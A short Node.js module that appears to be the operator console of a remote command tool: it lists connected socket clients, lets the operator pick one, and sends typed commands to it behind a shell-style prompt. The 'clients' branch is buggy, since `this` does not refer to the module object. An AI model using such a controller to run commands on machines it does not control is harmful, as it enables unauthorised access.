"use strict";
const server = require("./sockets/socket_server.js");
const updateDashboardClientCount = require("./webserver/ws_server.js");
const socketClients = require("./sockets/clients.js");
// Setup input prompt.
const readline = require("readline");
const rl = readline.createInterface({
    input  : process.stdin,
    output : process.stdout,
});

const util = {
    getClientCount : async (server) => {
        await server.getConnections((err, count) => {
            if(err) return err;
            else {
                console.log(`There are ${count} connection(s) now.`);
                updateDashboardClientCount(count);
            }
        });
    },

    takeAndSendCommand : (socket) => {
        rl.question(`${socket.remoteAddress}) # `, (cmd) => {
            if (cmd === "clients") {
                this.getClientCount(server);
            } else {
                socket.write(cmd + "\r\n");
            }
        });    
    },

    mainMenu : () => {
        for (let i = 0; i < socketClients.length; i++) {
            console.log(`${i}) ${socketClients[i].address}`)
        }
        rl.question("Select client:\n", (cmd) => {
            util.takeAndSendCommand(socketClients[cmd].client)
        })
    }
};

module.exports = util;